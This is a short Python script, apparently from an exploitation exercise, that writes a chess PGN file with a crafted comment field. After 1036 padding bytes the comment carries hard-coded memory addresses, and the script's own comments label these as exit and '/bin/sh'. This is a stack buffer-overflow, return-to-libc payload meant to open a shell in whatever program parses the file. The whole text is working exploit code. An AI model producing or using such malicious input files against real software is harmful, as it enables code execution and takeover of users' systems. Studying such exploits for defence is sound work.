fw=open("dummy4.pgn","wb")
fw.write(b'[Event "State Ch."]\n')
fw.write(b'[White "Capablanca"]\n')
fw.write(b'[Black "Jaffe"]\n')
fw.write(b'[Result "1-0"]\n')
fw.write(b'[Board "4r3/6P1/2p2P1k/1p6/pP2p1R1/P1B5/2P2K2/3r4"]\n')
fw.write(b'[CommentSTX]\n')

fw.write(b'A'*1036+b'\xa0\x3d\xe4\xb7'+b'A'*4+b'\x00\xc0\xfb\xb7')

#fw.write(b'A'*1036+b'C'+b'A'*4+b'D'*4)

#exit: 
#0xb7e43da0

#'/bin/sh'
#0xb7fbc000

fw.write(b'\n[CommentEND]\n')
fw.close()